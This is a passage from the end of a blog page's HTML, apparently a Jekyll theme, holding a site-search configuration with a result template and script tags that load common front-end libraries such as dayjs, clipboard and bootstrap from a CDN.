document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
